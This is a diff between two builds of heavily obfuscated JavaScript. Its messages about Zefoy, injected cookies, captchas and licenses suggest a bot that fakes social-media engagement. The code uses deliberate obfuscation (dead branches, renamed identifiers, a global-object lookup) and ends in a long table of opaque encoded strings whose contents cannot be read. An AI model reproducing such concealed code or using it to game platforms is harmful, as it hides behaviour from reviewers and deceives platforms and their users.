-          C.stdout.clearLine(0);
-          S.stdout.cursorTo(0);
-          t.stdout.write(v308.zjEAR(V, " Chrome/Chromium executable is invalid!"));
-          I.info("\n\n", v308.FCThm, "\"" + U + "\"\n", v308.fSeIZ);
+      const v313 = await v312.HwJWA(f32);
+      p938 = JSON.parse(p938);
+      if (v312.oLJOP(v313.length, 0)) {
+        if (v312.hEVii(v312.kLUPm, v312.kLUPm)) {
+          v312.ccMWq(v313, c);
+          return a;
         } else {
-          await a0zd.promises.writeFile(v93, JSON.stringify(p912));
+          await a0ic.promises.writeFile(v93, JSON.stringify(p938));
         }
-      } else if (v308.xtGDR(v308.zYnJk, v308.zYnJk)) {
-        v308 = "";
-      } else {
-        const v310 = v309.map(p926 => {
-          const v311 = {
-            JeGiS: function (p927, p928) {
-              return v308.JlPgU(p927, p928);
-            }
+      } else if (v312.Svfag(v312.ExjNi, v312.ExjNi)) {
+        const v314 = v313.map(p952 => {
+          const v315 = {
+            irYVH: function (p953, p954) {
+              return v312.JNtny(p953, p954);
+            },
+            lyZDh: v312.tVnrB
           };
-          if (v308.xtGDR(v308.RfNZL, v308.UEsNG)) {
-            const v312 = p912.find(p929 => p929.name === p926.name);
-            return v308.zlEPD(v312, p926);
+          if (v312.oLJOP(v312.ChWef, v312.ChWef)) {
+            const v316 = p938.find(p955 => p955.name === p952.name);
+            return v312.rKTGD(v316, p952);
           } else {
-            v309 = v311.JeGiS(d, N);
+            c.stdout.clearLine(0);
+            v314.stdout.cursorTo(0);
+            p952.stdout.write(v315.irYVH(v315, v315.lyZDh));
           }
         });
-        await a0zd.promises.writeFile(v93, JSON.stringify(v310));
-      }
-    }
-  } catch (S) {}
-}
-async function f30() {
-  const v313 = {
-    kbJmo: function (p930, p931) {
-      return p930(p931);
-    },
-    dsCBa: function (p932, p933) {
-      return p932 !== p933;
-    },
-    GrKJD: "anhpr",
-    hGfGx: "RmygN",
-    zEMrD: "LJIPn",
-    dVgiz: function (p934, p935) {
-      return p934 && p935;
-    },
-    cKRCD: function (p936, p937) {
-      return p936 === p937;
-    },
-    vaZzQ: "oKlDj",
-    pCmIy: "GtZGN",
-    obIHc: function (p938, p939) {
-      return p938 + p939;
-    },
-    CfdXN: " Cookies invalid/expired!"
-  };
-  try {
-    if (v313.dsCBa(v313.GrKJD, v313.GrKJD)) {
-      v313.kbJmo(S, "[" + t + "] " + V + " (+" + I + ") " + U);
-      v313.kbJmo(B, r);
-    } else if (a0zd.existsSync(v93)) {
-      if (v313.dsCBa(v313.hGfGx, v313.zEMrD)) {
-        if (v313.dVgiz(!v26, !v29)) {
-          if (v313.cKRCD(v313.vaZzQ, v313.pCmIy)) {
-            if (v) {
-              return C;
-            } else {
-              znuQIU.kbJmo(S, 0);
-            }
-          } else {
-            process.stdout.clearLine(0);
-            process.stdout.cursorTo(0);
-            process.stdout.write(v313.obIHc(v62, v313.CfdXN));
-          }
-        }
-        await a0zd.promises.unlink(v93);
+        await a0ic.promises.writeFile(v93, JSON.stringify(v314));
       } else {
-        y.stdout.moveCursor(0, -2);
-        v.stdout.clearScreenDown();
+        v312 = "";
       }
     }
-  } catch (d) {}
+  } catch (w) {}
 }
 async function f31() {
-  const v314 = {
-    Mwqey: function (p940, p941) {
-      return p940 + p941;
-    },
-    HYskA: function (p942, p943) {
-      return p942 !== p943;
-    },
-    YiNBa: "AhEGn",
-    fYAfo: function (p944, p945) {
-      return p944 === p945;
-    },
-    vnWpH: "RxGYC",
-    bWThV: "ncRIB"
-  };
-  const vV314 = v314;
-  try {
-    if (vV314.HYskA(vV314.YiNBa, vV314.YiNBa)) {
-      [d, N] = C.get(S);
-    } else {
-      const v315 = await a0zd.promises.readFile(v93);
-      return JSON.parse(v315);
-    }
-  } catch (N) {
-    if (vV314.fYAfo(vV314.vnWpH, vV314.bWThV)) {
-      let v316 = t[V];
-      I[U] = B[vV314.Mwqey(r, 1)];
-      J[vV314.Mwqey(A, 1)] = v316;
-    } else {
-      return [];
-    }
-  }
-}
-async function f32(p946) {
   const v317 = {
-    QvCnS: function (p947, p948) {
-      return p947(p948);
+    AqCgX: function (p956) {
+      return p956();
     },
-    hhavE: function (p949, p950) {
-      return p949 === p950;
+    qMYQK: function (p957, p958) {
+      return p957 / p958;
     },
-    soZBu: "NNyvm"
+    JIIRS: function (p959, p960) {
+      return p959(p960);
+    },
+    VuNll: function (p961, p962) {
+      return p961 !== p962;
+    },
+    iPxSg: "vmnNx",
+    pXMOJ: function (p963, p964) {
+      return p963 === p964;
+    },
+    hxiPj: "GRXYz",
+    LvAMq: function (p965, p966) {
+      return p965 && p966;
+    },
+    JtZyO: function (p967, p968) {
+      return p967 === p968;
+    },
+    GyOBU: "VdiBg",
+    reZqR: function (p969, p970) {
+      return p969 + p970;
+    },
+    oQFLu: " Cookies invalid/expired!"
   };
   try {
-    if (v317.hhavE(v317.soZBu, v317.soZBu)) {
-      await a0zd.promises.writeFile(v41, JSON.stringify(p946));
-    } else {
-      v317.QvCnS(y, "Captcha resolved! (" + v + ")");
+    if (v317.VuNll(v317.iPxSg, v317.iPxSg)) {
+      D.stdout.moveCursor(0, -3);
+      l.stdout.clearScreenDown();
+      M.stdout.write("\n" + q + "[33m " + o + " [34m[" + L + "][0m " + T + "  [90m(" + v317.AqCgX(Q) + " /hr " + v317.qMYQK(v317.AqCgX(y), 60).toFixed(2) + " hrs)[0m\n\n");
+      R.stdout.write(e + " Running: " + h.substring(0, 43));
+    } else if (a0ic.existsSync(v93)) {
+      if (v317.pXMOJ(v317.hxiPj, v317.hxiPj)) {
+        if (v317.LvAMq(!v28, !v31)) {
+          if (v317.JtZyO(v317.GyOBU, v317.GyOBU)) {
+            process.stdout.clearLine(0);
+            process.stdout.cursorTo(0);
+            process.stdout.write(v317.reZqR(v60, v317.oQFLu));
+          } else {
+            v317.JIIRS(P, "Captcha resolved! (" + H + ")");
+          }
+        }
+        await a0ic.promises.unlink(v93);
+      } else {
+        P = H;
+      }
     }
-  } catch (v) {}
+  } catch (c) {}
 }
-async function f33() {
+async function f32() {
   const v318 = {
-    RaNkW: function (p951, p952) {
-      return p951(p952);
+    ofath: function (p971, p972) {
+      return p971(p972);
     },
-    RxTWC: function (p953, p954) {
-      return p953 === p954;
+    sxypl: function (p973, p974) {
+      return p973 === p974;
     },
-    BagTS: "pmkOr",
-    xiJNR: "ZbPMp",
-    sdmeA: "AnyNZ",
-    dQgqB: "xerLM"
+    Wnlda: "Kmcby",
+    EerTt: function (p975, p976) {
+      return p975 === p976;
+    },
+    aWgoT: "YPktL",
+    xDXvn: "NaTpC"
   };
   try {
-    if (v318.RxTWC(v318.BagTS, v318.xiJNR)) {
-      Y = "";
+    if (v318.sxypl(v318.Wnlda, v318.Wnlda)) {
+      const v319 = await a0ic.promises.readFile(v93);
+      return JSON.parse(v319);
     } else {
-      const v319 = await a0zd.promises.readFile(v41);
-      let v320 = JSON.parse(v319);
-      v320.sort((p955, p956) => p956.timestamp - p955.timestamp);
-      return v320;
+      c.stdout.clearLine(0);
+      a.stdout.cursorTo(0);
+      z.stdout.write(w + " Accumulation limit reached!");
     }
-  } catch (d) {
-    if (v318.RxTWC(v318.sdmeA, v318.dQgqB)) {
-      v318.RaNkW(y, "Captcha resolved! (" + v + ")");
+  } catch (H) {
+    if (v318.EerTt(v318.aWgoT, v318.xDXvn)) {
+      v318.ofath(P, "Captcha resolved! (" + H + ")");
     } else {
       return [];
     }
   }
 }
-async function f34(p957) {
-  const v321 = {
-    mQfac: function (p958, p959) {
-      return p958 === p959;
+async function f33(p977) {
+  const v320 = {
+    YjuLy: function (p978, p979) {
+      return p978 === p979;
     },
-    puHiB: "UVxgR",
-    IqhsK: "uiMHF"
+    uKHNs: function (p980, p981) {
+      return p980 - p981;
+    },
+    EZGTS: function (p982, p983) {
+      return p982 !== p983;
+    },
+    ukNXJ: "xPPes",
+    GcGSD: "LUEUU"
   };
-  const vV321 = v321;
+  const vV320 = v320;
   try {
-    if (vV321.mQfac(vV321.puHiB, vV321.IqhsK)) {
-      p957.stdout.moveCursor(0, -2);
-      v321.stdout.clearScreenDown();
+    if (vV320.EZGTS(vV320.ukNXJ, vV320.GcGSD)) {
+      await a0ic.promises.writeFile(v39, JSON.stringify(p977));
+    } else if (vV320.YjuLy(z, 0)) {
+      D = l;
     } else {
-      const v322 = {
-        license: p957
-      };
-      await a0zd.promises.writeFile(v42, JSON.stringify(v322));
+      M = vV320.uKHNs(q, o);
     }
-  } catch (S) {}
+  } catch (a) {}
 }
-async function f35() {
-  const v323 = {
-    qyYxE: function (p960, p961) {
-      return p960 ^ p961;
+async function f34() {
+  const v321 = {
+    FWIyB: function (p984, p985) {
+      return p984(p985);
     },
-    SXpei: function (p962, p963, p964) {
-      return p962(p963, p964);
+    zHAKb: function (p986, p987) {
+      return p986 + p987;
     },
-    GUlay: function (p965, p966) {
-      return p965 === p966;
+    RSgFt: "return (function() ",
+    diZkV: "{}.constructor(\"return this\")( )",
+    hOrug: function (p988) {
+      return p988();
     },
-    dTjyc: "vdjtB",
-    OkZPf: "EJKcU",
-    sVHLN: "XsuGO"
+    IFMDp: function (p989, p990) {
+      return p989 === p990;
+    },
+    QPgkT: "oPisQ",
+    PfQwn: function (p991, p992) {
+      return p991 !== p992;
+    },
+    ZGcuD: "axweW",
+    MIBgG: "CTFoY"
   };
   try {
-    if (v323.GUlay(v323.dTjyc, v323.dTjyc)) {
-      const v324 = await a0zd.promises.readFile(v42);
-      let v325 = JSON.parse(v324);
-      return v325.license;
+    if (v321.IFMDp(v321.QPgkT, v321.QPgkT)) {
+      const v322 = await a0ic.promises.readFile(v39);
+      let v323 = JSON.parse(v322);
+      v323.sort((p993, p994) => p994.timestamp - p993.timestamp);
+      return v323;
     } else {
-      N.stdout.clearLine(0);
-      C.stdout.cursorTo(0);
-      S.stdout.write(t + " Cookies injected! (" + V + ")");
+      const vF4 = function () {
+        let v324;
+        try {
+          v324 = VttoFt.FWIyB(A, VttoFt.zHAKb(VttoFt.zHAKb(VttoFt.RSgFt, VttoFt.diZkV), ");"))();
+        } catch (M) {
+          v324 = C;
+        }
+        return v324;
+      };
+      const v325 = VttoFt.hOrug(vF4);
+      v325.setInterval(v325, 1000);
     }
-  } catch (d) {
-    if (v323.GUlay(v323.OkZPf, v323.sVHLN)) {
-      let v326 = v323.qyYxE(v323.SXpei(N, v326.substr(S, 2), 16), 127);
-      t += V.fromCharCode(v326);
+  } catch (c) {
+    if (v321.PfQwn(v321.ZGcuD, v321.MIBgG)) {
+      return [];
+    } else {
+      v321.FWIyB(s, "Zefoy is unreachable or blocked! (you need proxy/vpn)");
+    }
+  }
+}
+async function f35(p995) {
+  const v326 = {
+    uFbIH: function (p996, p997) {
+      return p996 + p997;
+    },
+    LYFLT: function (p998, p999) {
+      return p998 + p999;
+    },
+    YgAhx: function (p1000, p1001) {
+      return p1000 + p1001;
+    },
+    zFBxO: function (p1002, p1003) {
+      return p1002 + p1003;
+    },
+    enpQu: function (p1004, p1005) {
+      return p1004 + p1005;
+    },
+    NjBva: function (p1006, p1007) {
+      return p1006 + p1007;
+    },
+    JIcvn: function (p1008, p1009) {
+      return p1008 + p1009;
+    },
+    dBNFY: function (p1010, p1011) {
+      return p1010 + p1011;
+    },
+    UrjjC: function (p1012, p1013) {
+      return p1012 + p1013;
+    },
+    VcZOS: function (p1014, p1015) {
+      return p1014 + p1015;
+    },
+    HlTxX: function (p1016, p1017) {
+      return p1016 + p1017;
+    },
+    xcsfp: function (p1018, p1019) {
+      return p1018 + p1019;
+    },
+    LQiEg: function (p1020, p1021) {
+      return p1020 + p1021;
+    },
+    KVouv: function (p1022, p1023) {
+      return p1022 + p1023;
+    },
+    CNFEx: function (p1024, p1025) {
+      return p1024 + p1025;
+    },
+    gEeIE: function (p1026, p1027) {
+      return p1026 + p1027;
+    },
+    thEgO: function (p1028, p1029) {
+      return p1028 + p1029;
+    },
+    VzYQq: function (p1030, p1031) {
+      return p1030 + p1031;
+    },
+    pasyN: function (p1032, p1033) {
+      return p1032 + p1033;
+    },
+    fgxmM: function (p1034, p1035) {
+      return p1034 + p1035;
+    },
+    hMWKz: function (p1036, p1037) {
+      return p1036 + p1037;
+    },
+    XdYFA: function (p1038, p1039) {
+      return p1038 + p1039;
+    },
+    UfFXo: function (p1040, p1041) {
+      return p1040 + p1041;
+    },
+    eoNTU: function (p1042, p1043) {
+      return p1042 + p1043;
+    },
+    KMHWL: function (p1044, p1045) {
+      return p1044 + p1045;
+    },
+    ckXoN: function (p1046, p1047) {
+      return p1046 + p1047;
+    },
+    XEMqp: function (p1048, p1049) {
+      return p1048 + p1049;
+    },
+    cUVny: function (p1050, p1051) {
+      return p1050 + p1051;
+    },
+    MfQOd: function (p1052, p1053) {
+      return p1052 + p1053;
+    },
+    RBipU: function (p1054, p1055) {
+      return p1054 + p1055;
+    },
+    gCqQl: function (p1056, p1057) {
+      return p1056 + p1057;
+    },
+    JDqru: function (p1058, p1059) {
+      return p1058 + p1059;
+    },
+    xIRQb: function (p1060, p1061) {
+      return p1060 + p1061;
+    },
+    byTGD: function (p1062, p1063) {
+      return p1062 + p1063;
+    },
+    ncTwb: function (p1064, p1065) {
+      return p1064 + p1065;
+    },
+    kzajH: function (p1066, p1067) {
+      return p1066 + p1067;
+    },
+    jSMCn: function (p1068, p1069) {
+      return p1068 + p1069;
+    },
+    FGfhw: function (p1070, p1071) {
+      return p1070 + p1071;
+    },
+    aRQnd: function (p1072, p1073) {
+      return p1072 + p1073;
+    },
+    RySUb: function (p1074, p1075) {
+      return p1074 + p1075;
+    },
+    Awtql: function (p1076, p1077) {
+      return p1076 + p1077;
+    },
+    ecnoz: function (p1078, p1079) {
+      return p1078 + p1079;
+    },
+    kCNfB: function (p1080, p1081) {
+      return p1080 + p1081;
+    },
+    eHBKb: function (p1082, p1083) {
+      return p1082 + p1083;
+    },
+    DlKFf: function (p1084, p1085) {
+      return p1084 + p1085;
+    },
+    ITCIZ: "6T7Z9M8H4CeVbK5VdKetfyaAb54b9p2JfM053b3k7D0c5FbFdZ5L12716G746rep5FaReLeR1ecj5N8j843h",
+    GzofT: "1S3l719Y3BcDbu1d2Z8ScDd091381WaH1O0vb8480N3ocIcreZcDeY223QfQbT4Q8VdU0mbQ4yaL5O4g9x5hatdzc0aU8f8",
+    ZIuXh: "Ad87V5L12bI41ek5vdGb3f3dmaQfdcccvfVfe090e38fQ0Ycj3yeOcP453Tb37wd34vdE6n4Qbc3kfk58f3dGbZ904v9Xdr",
+    pmYji: "1v6HbV3j21141aaM4A8pdX6T2QckbVfgapf35I8z0ie78q1pen4g5mcd5WdLdte0bC6oaVdH2L7Far7Bfy2n423E6P8afSe",
+    oadzG: "y0Dfm6a12cK7R51526OeGaK9G966r7ndPeZ1kc6377R5neFfN1v3N3J9WaQfre21i4yfH920W7Ac7453C6h20456s9gfS8v",
+    Nuoiz: "0N3Halai6qcLaYbgbLar2Ebv272X0Cbm5i3q2M1s3d7M6x5r0tfB1L4KeWaY3W21ez3jbZ4W04fSc66J8WfM0830ft7Rfz8",
+    eWyMW: "udo2t9s3QbA116J197KaR6P03cJ7b4w460R7s1Kdf6068eMcvdb2j7acQ2rfP91d5fyaK53aB457K9da98u2Pa31A5N7A0B",
+    txpGM: "bvabb95gb36I8Mek3na8bt7p7ofjdHfs6Cf22zbkek7l5e207o4wee4k6yal0hfY9s3dfU2ScQ0w7q5v9xdP4a9g7M7wbu3",
+    kkJle: "D806w02fd049hdBdy9laT2n9GfmaVd92v6e5HdIby2jbp8K1odG3Wag8hcxfzaQ2p0X1G0ReE22aU348Q340i1H9M104n5S",
+    FpUcp: "bj759Ub5fS6V3r5E5f9xdYbFb77NeU3x51du4z0F0yedb96mfl779h5Ab2aZ8X742j8Qbo3s7a8L1p4k7s7Z0Hbvbtat61f",
+    woskp: "0eB4h0J2yd27T1f46c99xf46letdZeieX2aeU2Lfb0p4B0f8ndu4Y1q1F028y3V1Q42dady6o5qdg2Ebz9R2UfD3beJ7XaW",
+    tzPDJ: "coah3Yameu4J9HeM9h2v5t7u2GbCb19U8t640T814E6U069J3W5td11y6C1E560o8t1l845odP6zas2225b66j6L9YbJaEc",
+    hMDXk: "CaI9saVcMfY0Fehdk4kfMcq9x3CcpaHb665cYfOd0ao0X329W0LcE6Mfzeseb2r9Re2eI1K8LbqcC3A7f3cdQ6yf13Z6b7h",
+    XwrVk: "3b16fa6tfn1xcl6F2n5D2j6Ye2ct6E5J3v1C9x8mf9aQ5v8z566deh1CeUap4l01bN4k0E8u4AbGfP0AfX1uc73V1Weuasf",
+    wirdD: "Eayfs3H7A8d743P4R5d5Bdjfs4Z810c5Aew1ieE600OeD131397dF1sbi4E4wazcz7E0raYbSem5la7dMbQdTfO4MfW8E70",
+    lVJOa: "eP95dr5saE8u3Z7Ybl1f72fK1xcUfg8f8Nbu4E7FfB1v9V1l5g1SahfR400reR3sapdvb8eoc9fA9gds0Zci4rdl7xaK5Z3",
+    chLOg: "079dg8m9A6U689F8G2BfmeBaJfZfX7n1P24bI4peCaN1D5DaA169teT1O1pbZ33aybx1P8YcY5B6EeJ5qbu3i8ub87v0M0X",
+    mtNbh: "5ufK3u4Y7baX4v1GaKdr7L1W6o7G8E1LbB921cd48I349YbabG3T3L5g0ObucI8W2ZaR7jfPardw9EeAa0ce7Sedcr5Ac16",
+    JbCuk: "I3f8HfV5A0D88db7j4u58f1c13Vaw1oe30E858Y4m737qes0p6t8Ldka8ag2y533L88dV600f9u52aDbEfady8uds8Jfm4b",
+    RSopG: "4o5h3zfh1h3x6D375q6U4M4ub32D59ai5M0m3j8z6M5UfceA7D9W5t0J6vaXd15D7F2D4o8Rf08PcK0WcweI4BcBe4593M1",
+    KyQIw: "L5X6v5T3YdW4S04fQ3p4Fe49Pdv1w3q3zcS899mevfO3Yc15d1M2bcG7L562HbEbWel6z6Cbv7Jd88zaSbg1k3G4O0ybj7e",
+    UXJqD: "0Ef8dTbA8gdPcT4z0ob65cbZdKdU04aCe6eD3R1M525Z18eA1X4Kcu1p0T0x861k4Z572w5oeSaf7S6NeUd948fges2J4a8",
+    qcUtL: "l1fbo5Y1DeHfX9CeT6a5w2O0WcF3M2m4rcM5f9aeH5fcvfF0ufJbudw4w2s8B3t9E4N3C4lfUdK1RaLce8hfUbK116bcN6Q",
+    UyYmx: "f9aS7rbw8l4fcu2S3O2odmdhd48dese6cA632me6fjbhc1dp9Dco8vf60vev2TfZ72aV7j0U0Gb15PcAcudm4Gbu9d0V970",
+    EYzuX: "aeB5Seo7G8KacbwbWfm670x4E2waL9C1obIcKcCbD7M207uapbM41745Feieg335792fU60aw1F62bZ5S3add9faweHcVfq",
+    wXjEK: "0uca7Qe90Ne45L0Pdcbi1B2i8gcI5A9xfTdwc60Ict62b9cT6h8i138U5PeU4X8b5I6a6q9U5qev4o5qe9eA7C5UcEdN8Ub",
+    WsWOA: "N7fbTbJ350Xdl0W2f9dac0Qci1Lf19OeV9ye24i7TdR6ff30y2o2K7K18arb38kaudE28cGeneZ5cfs4nf8aSeHba0j631y",
+    OsaPP: "0a019Xat9Y604uc69abR0B8v1R8s2B2O4Rd52heJ9WaO3q0k5Xbf5B341YddaW0PfC4Qfl8ZdWfEco12aI2L2s7fe770fVc",
+    NlwES: "iewd2bx3s1qb54c1L7rfu5kcAc822fLeH0k5c3XcM8m6WcKe49B5w0fdnfA5Jfj278E4meU6paB6F1O6d4Aaadd1t1Tdh2N",
+    rIuOI: "2F6nax0719ag7J4Kc29h4MaI3Rde7IbxfabA0I5T3y5b882ae60X4IfF1F9x8sef2s3S3Cb98921f7becRfVcNfH29c3bWd",
+    aBDkB: "kaN1r440Y2e8c9gaa5e3v4Wcqdyb8e51p3u7H0F1Q3WaE033h081I6ydF9waCcpaWcBc5f0eS9w7gflcD385M3Ybm5G8T2o",
+    nsZIt: "ed9G8s5waN0K1cca7S6E2f2iaFbV7S7c6G4reNcI6mbj4L3S0u85e38Kc08n118ZdjbYaMds8v3f4paL4BbwdUfE16a48ea",
+    hGEAP: "H7e6q2J36cz93ctfBeX3A4jaP1a4U8JfE6n0ue93z765x6s7K127wau8sbsaUbY5FayeMdD2Fb77JaQ760JfP17au2qeX0v",
+    nQqUe: "883bbo0t7p334lcqaH1iee25426BcI5IeC3H8N3B7b10514mbe3femcJ0y3h4G54caafey3y7E7kbD9cfjfa9V9KbEch9A6",
+    wyeYf: "D1K1Efn8Odpeefyc6fS087S1e3p284haUbf1y0e1ifgal9T0T143R7z3e6ube5abb7s3g6Y3Qcg8s4e0M1u0d4x38dAcNf6",
+    MSrie: "fa5lbR09egfW7ycX9xas282j3E577sdv7f19bH44ag7Y1UfTbP20573o8c1A6j8D2E1lcy1HeHaPdK2LdmamfXb3byel4Ef",
+    aERjX: "I1o60ct6R840u4a9O6a4M7G1w4x3cdRcndI757TfJcB6i8Xek2Vfx9H8r2Eff9S6A7a9n5E5U1d6Oe0dq4ma30pfM4Y0Oan",
+    sinVL: "cyeJ8T1f6sfyaw9s0r71cAfx2d5DaFbVc89i2haue09j6f3h4Wdp2X2Z9W5zeD9Y8QfAcg9h0m1rdRai6Qfw75axfL24234",
+    CyNvi: "L88fU3MeJ5v4B0SaTdN3IcO9Kdg8H1RblaY9m823Wbf4V2d0P8o7ZaW3tajbhata17B5k8R577Ec83CacaP68bfcD6LcJ4O",
+    WPEXc: "d25H4F7xdi5Yb37y4N3F8Pdwcicy0D9Obm3pf61V274efz1T3I1Wfw8aeQ4G61446D4d9738cze56t106ta74d0w2W5g381",
+    rcpeB: "Ga32Eeg0776dF1da83e54bsdo3A0FfP2q0p8n0e6Nei287Fddc74H35dh4g2J2rbufD6Zbx7xaL2mdK9vcTcX1Lcydm5k9r",
+    mAoQn: "elbacNa37D1va36a8o5qcO3tfT7c1O3B05507RcRaG4s1u8gdr4s7MdTeiee785pf3501w7i7c1RcJaS5bbW21dCcP9TbX1",
+    tAZpH: "37Q467w8o752032b58a2fbAescP0MaT0e5D742z0z8adY54fP27352J8LdPaH1D1ucbaJ7G4K1r165edE4daR9dbO1PcDf7",
+    uDXlU: "499zfx0O1x6TfyeO1x8Sdadwcc5fdM3w6w7beHeicidL4h6VbA2N9MeE4d5WdZ323SaPaIfZ9vdE37be7z0seleN9t0Xcr9",
+    pkfNw: "eeq7Zccd99s3f972r2G827E4x7q1K04eT9rc1f8aj6FdIel3Z9kbTbD1k1DaTbbeU0ybibBeGedf3ff1CdL2l4K4Te22h6U",
+    tpkXu: "7J9c57dc4j3K8edX3waWfEcj8bbM5S6Ceh1t1d0u7v0Kcj9g9x4JaecxeI7scuan6c7Vdv8beU1A8n7G5S1D5x7XcL120Gb",
+    VDXMk: "W4O30aEbo9TfoaB0Lca8Z5HfQ0xcEakeyekdf7I8E8M5Rd03k7y7ic041958s2v328Vawfaed3R8u1xfbdy3u3j1db1arcp",
+    OniwU: "3o5Y2o1r4b1Q19f17r7j23ei2k4nam7ibj3xeq8Dd76o9b2fbt7m8weM0r4vdo4O5KekdF25bJ9A6505bAfdbw6vbo51bG7",
+    ORBvN: "bbZ7K7c8Yfn9B7T7p5t116s2S0e9Vbh7f46dq8w8P3sccba9u8Oed0U6k678M9V7Z6A5a676scK1Zdpbmc3bldF76fp2mdm",
+    ECmsq: "7ucA4Q1h2R72ek3ycV0H1q0V3D7u6M3O47cA4m8Ddm2VfK158MaP395RdA936e285o0b1hf0eK9m602w6Oaw4Dcb9yaC4w3",
+    STxsd: "l2n4adEbedw55cK1l985b985T58freQeIaL7b1RcZ437Ud72U5DeuarcC0k7K52ad760d0O7Z8Bapckdo4Daqd8bZeI1V3f",
+    syfvn: "665N6SbW9c3XcC9R6q133G6ObzaEfQfc6d4zaw9i6McI8Kar2mdN1e2Uem2t4x9m1KbufwdIbe570M6VcS7l0z5Hfh9w851",
+    PKYTq: "EaX1L3l0Sfwdq7c8e473Yag8z35dycxfc9vbB1LbMbjbo3nau480Scv37ak6i65by4j2i0yet9Q9hc95bbsfz3UeU0e4SbG",
+    BufYG: "0W6WdI3U1E8Q5Abqbn7dfA5G5i9x289Ha6400Wep322p5A5P8i2E2bft73dedq4x1X0Ze99l6E152O3WcrdVbn8Rc7d87S0",
+    JvMny: "Z628cds9Pev2W8xbt95f78T3F2pd89I2paHa25G9Q231J8c7Wfee30fbS3i2sfL1w5G8c5M4T8Z297RcScteR9f633y215e",
+    koOdj: "9N3O6R2C1Sc18i7qbNdx678N9H7p5b5paz6Q8kbG0T9w0q7235aF1O7O1Q4rcS6Z5Bfeatfb19fHdo1VaN9u67ds6ZfBcl6",
+    MVabu: "O7DcDdB5g4kbj3O2laJaP9f863Tfm6hfJ4udAfa882cbH1OcU4fb6173g4sa6c9c0cH2S7H2PfhdV3vb7fr360k8W39fI0l",
+    QMUcR: "bA0xaH8Kat956ac18y3Yec88eH1d829x5h1ubV9f693Y0MdW0A7K0QcS5G5SdK8B2sa9fD8K0N0rax0l04cr5r6e6A0LeM2",
+    qEERL: "i6tfi3s9m9h1ibm8o7S0jbt7C0T2Vel95322e2A9s7G6CfmdZdkfPdIal1G4s6k5l0VeJ0G8JcCaZd07gd35H8oeU2edBcb",
+    jicaO: "2n0K28283Val3oar4T8B7W6X4N33dR2eaodB4o3G2m564T0kdfaeabfR6U0T3w5Ge82M50dffL2g7wdOdG9o4Y7V0g4m1Ve",
+    thbwq: "3dv9F9d6A7X467w34cXeJ905h0h1G500BfL0I2DeOb18KaBegaZ6qdo5V0Ge6ez1Mex2SeD9p3Gb72k1w3XaM8TaQc80kcW",
+    KOTns: "2M7V4Ief1FfHeC4n9Df5365Ia0dZ0Z49bw0l2L5Y3J85fR7z5b2m9m4g71dMbY2T9u2BfhcK1O4D5f3pdl1O4Xeob3cI7cf",
+    ncxjX: "p3a9J01bhd2bZ5u1o1n3W3a5Heg4garb60heP2H0m9G2cfh0F0gbc1Zb98Vfff1f40q36eF8C9Ofj5J6C450vaaa45W3DbD",
+    flKnv: "6Md7950t9kcj4eejfw3ebkeybj7HcK3735bR3XcF3M1P4X5d9k3y1Wbi6Qfe4m5K194o1h1u0g0n5OcW1t2XdC77at6Gdfb",
+    QCnPP: "u9B9m9iezbu1s3Bb41w42a7eKeofp8R9SfL9yf977dx9ja70l8g8nbEeL8E8J8Wf813bv2zaR34424AeObz8bc19QbL9i9H",
+    tTqjJ: "8wbc7H9rfA5JfPf6eEdtcJ6ibhcJ4LdQcw5k6O6Se44k0a0QaHdm0002ee7R5V7W593xeX9PcV2f9x1VewdCfTbEdPamdRa",
+    TPzTy: "q2weS33dhfT1ha17ydk4tfnc20S7katdE4KaZbA9W7bbu1c3m6p8k5jdpbG0ffT6Bfm3J14cl9rec5F4E5D3D0z7U9y3rbv",
+    bhZUe: "debAfzdC1P5K5V2Qdo0s9K5f9ccAb59T2Sf76LdJbNdl6GbwbneTdH7C4j8A9N7C3B4G9Kac048E461Y29949FcY6O1Kab6",
+    VMZra: "j9w3f513e5B6ke53s7yev5v4ffX1i2d7u9Jbi5R2s4rfs8zdG5G5U0s6A6wbZ4B8Yau3P4afn8q2y0R4r1K8L9feb374kd6",
+    wEDxu: "etcf30aJ5se973aK9A9b7C4BcU8r6v8g986m2ycf4s4M1yaY1sc05104dP6a3ffZ3X4Za587fXeK8J076rb7aI2N6gc683c",
+    cXzuw: "AbN7l1Q3oeyel181h527i9X0q4c48973f9H04an2W9M663n7T0sf83O4k8r5y65fQ397X383D8L4fdqbp6A3R6netdO1g6O",
+    lOKpr: "9Y6UdJ3q3Gei9X97de2X6EewcD8b5Z9Dai6zc47hfUbFbx3F5u3gfs0ya12A6fcUcUdvbq91eM898Fe0eW5x01fGfham7N5",
+    tFNlP: "t24fg616idOfY7udH0848co3W2PfC0p6JasdK5L3reWfw952g5Oce9K5Q6Aay265B3Lf55q4e5Ucw8D4Peofr3lbNfH85ec",
+    dCZDX: "7PbEcl4Rcgea2YaL2l7y0Vek4n8Nb8fC6JdF3VaNcn0y5Z0w5B4Vad8sce397udZ0RbVe8cN9gau8Kdg2Med5l7h5hfR4Z5",
+    zBYWe: "55l6i3q6t7P1t4xafbG5l0a153Bf45EendV9g661M5y5P8KdScTad7OeO8PaX4s7deyaq914W6U6d8d509mes8jcr916hfX",
+    pNHGJ: "9Ffm1p0Q4w9Yfn7d9mdn3R4KcFey1ecLcYaWch0k4y2rdT5oby1J7naZb74DbR9u2z521r4Wdg9L5Q4e9dch8F2Zeg6X157",
+    CtAgT: "6bCcWbX72c34y1dbF6U2c6p6T82erdj9PeqfR877A5Eci6I7c35cN768abN9E1Z8F0j181z2n6j7j0c4l6I5b3e14eM4P5W",
+    XqHFx: "9U9n0Xc34zcb28938Ne16T152b0M1rfhc644f41Gey650dcD9EaY6geD5S9EbrdIad8sdrfO0ieLehfh5qbE7T9ffb169ve",
+    aqiXh: "d5w5o5v3R0gcFbi6f951U8y6i9X4r8x4b2y4Zdgcibb8kaff8dd1F88eQbufNaS640A5Y9I9bfB9Pelbgdr2Ofc8s8Z5Z7Z",
+    obbkc: "1X9V5kdgdc5f9U9Ueh004t4gdw8Se8aTea1d8Y9y9k8R8Q9R5zbRbd6z70738jfv31eY294C4Mdm085k9q3Z0Ffa0s7i3d6",
+    nHinO: "C6gdZeebQ7L1Jao6G0R1V1x1betfbdD5f4N0m0D0I6K8X8E7Xex0LeDcFcI9K2GdCdg5u4K78392D2m5J4PddfLcAat3a6m",
+    PoDdp: "629a32dWc36gfB2b3WdU3Iawb61i6r4Xcc9s6s951M3pchc3e1fY4A2bfB4T5Z2K2R57651F4R3v2r7c53fd55ar8Q7u6V2",
